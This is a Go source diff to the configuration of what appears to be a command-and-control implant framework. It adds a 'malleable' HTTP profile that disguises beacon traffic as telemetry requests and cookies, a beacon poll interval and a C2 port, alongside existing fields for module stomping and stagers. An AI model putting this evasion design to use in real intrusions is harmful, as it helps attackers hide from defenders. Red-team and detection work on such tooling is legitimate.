@@ -72,6 +72,18 @@ type C2Routing struct {
 	Proxy   string `cbor:"5,keyasint"`
 }
 
+// MalleableHTTPConfig defines how the plain_http transport disguises itself
+type MalleableHTTPConfig struct {
+	C2Path        string            `cbor:"1,keyasint"`        // e.g. "/api/v1/telemetry"
+	SessionHeader string            `cbor:"2,keyasint"`        // e.g. "Cookie"
+	SessionValue  string            `cbor:"3,keyasint"`        // e.g. "session=%s"
+	InitHeader    string            `cbor:"4,keyasint"`        // e.g. "Cookie"
+	InitValue     string            `cbor:"5,keyasint"`        // e.g. "init=1"
+	CloseHeader   string            `cbor:"6,keyasint"`        // e.g. "Cookie"
+	CloseValue    string            `cbor:"7,keyasint"`        // e.g. "teardown=1"
+	CustomHeaders map[string]string `cbor:"8,keyasint"`        // Static headers like User-Agent
+}
+
 // Config build.json config file
 type Config struct {
 	CCAddress                 string `cbor:"1,keyasint"`  // Address of C2 server, might include port (agent side)
@@ -116,6 +128,7 @@ type Config struct {
 	PaddingMin int `cbor:"55,keyasint"` // min bytes of random padding per CBOR frame
 	PaddingMax int `cbor:"56,keyasint"` // max bytes of random padding per CBOR frame
 	Jitter     int `cbor:"57,keyasint"` // percent jitter added to check-in interval
+	PollInterval int `cbor:"61,keyasint"` // C2 Beacon interval (seconds)
 	// Module Stomping
 	ModulePath    string `cbor:"58,keyasint"` // Path to the module to stomp (overwrite) on the target system
 	IsRunByStager bool   `cbor:"59,keyasint"` // Whether the agent is run by a stager
@@ -136,6 +149,12 @@ type Config struct {
 
 	// C2 channel wrapper mode: h2conn.
 	C2ChannelMode string `cbor:"76,keyasint"`
+
+	// Port for plain HTTP C2 Server
+	CCHTTPPort string `cbor:"77,keyasint"`
+
+	// Malleable HTTP C2 profile
+	MalleableC2 MalleableHTTPConfig `cbor:"78,keyasint"`
 
 	// Runtime state (not persisted in config file)
 	MyAgentToken *AgentToken `cbor:"-"` // Current AgentToken issued by C2
